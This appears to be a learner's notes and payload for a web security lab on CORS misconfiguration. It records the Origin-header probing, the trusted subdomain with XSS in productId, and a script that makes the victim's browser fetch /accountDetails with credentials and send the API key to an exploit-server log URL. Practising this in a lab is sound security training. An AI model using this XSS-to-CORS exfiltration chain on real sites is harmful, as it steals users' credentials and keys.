/*

• Changing the Origin header to an arbitrary value like http://attack.com   
• Changing the Origin header to the null value
• Changing the Origin header to one that begins with the origin of the site
• Changing the Origin header to one that ends with the origin of the site

1) source reveals the API key is being fetched through /accountDetails endp

2) Changing the origin header didn't result in Access-Control-Allow-Origin being set

3) Null also didnt work

4) No 

5) Yes https://attack.0aa4003e0413e44e8659499900d400f6.web-security-academy.net
 So Access-Control-Allow-Origin got set 
 and Access-Control-Allow-Credentials is set
 //which means the site is having a CORS protocol in place
 // also changing the https to http is working 

6) GET /?productId=2&storeId=1
The stock check function is being loaded from a subdomain
stock.0aa4003e0413e44e8659499900d400f6.web-security-academy.net

7) productId parameter is vulnerable to XSS in the subdomain

8) script to make a clickable link which gets clicked on by the admin
    and his API key comes to the attacked controlled server

*/
// when the victim admin clicks the link we sent to him, the call will be made to this subdomain location
// which has our malicious script in the productId (which has XSS ) parameter
//
<script>
    document.location="http://stock.0aa4003e0413e44e8659499900d400f6.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); 
        req.onload = reqListener; 
        req.open('get','https://0aa4003e0413e44e8659499900d400f6.web-security-academy.net/accountDetails',true); 
        req.withCredentials = true;
        req.send();
        function reqListener() {
        location='https://exploit-0a00008304dfe475861a4879011900c7.exploit-server.net/log?key='%2bthis.responseText; };
        %3c/script>&storeId=1"
</script>